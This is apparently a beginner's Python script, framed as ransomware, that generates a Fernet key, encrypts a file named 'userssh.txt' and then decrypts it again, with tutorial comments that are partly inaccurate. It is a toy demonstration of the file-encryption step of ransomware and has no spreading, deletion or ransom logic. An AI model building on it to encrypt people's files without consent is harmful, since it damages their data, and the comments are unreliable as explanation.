from cryptography.fernet import Fernet
# where cryptography & Fernet is module
def write_key():
        key = Fernet.generate_key()
        with open("Ransomware.key", "wb") as key_file:
            key_file.write(key)
# 'def' stand for the keyword for defining a function.
# 'write_key' is a function
# 'key' is a variable
# 'generate_key' is a method
# 'with' is used for exception handling to make the code cleaner and much more readable
# 'open' The open() function opens a file, and returns it as a file object.
# 'wb' means write binary files
# 'key_file' is a bufferedwriter

def load_key():

    return open("Ransomware.key", "rb").read()
# 'rb' means Read Binary files

write_key()
key = load_key()
# 'write_key()' load the previously generated key


f = Fernet(key)

with open('userssh.txt', 'rb') as original_file:
    original = original_file.read()
encrypted = f.encrypt(original)

with open ('enc_userssh.txt', 'wb') as encrypted_file:
    encrypted_file.write(encrypted)


f = Fernet(key)

with open('enc_userssh.txt', 'rb') as encrypted_file:
    encrypted = encrypted_file.read()

decrypted = f.decrypt(encrypted)

with open('enc_userssh.txt', 'wb') as decrypted_file:
    decrypted_file.write(decrypted)
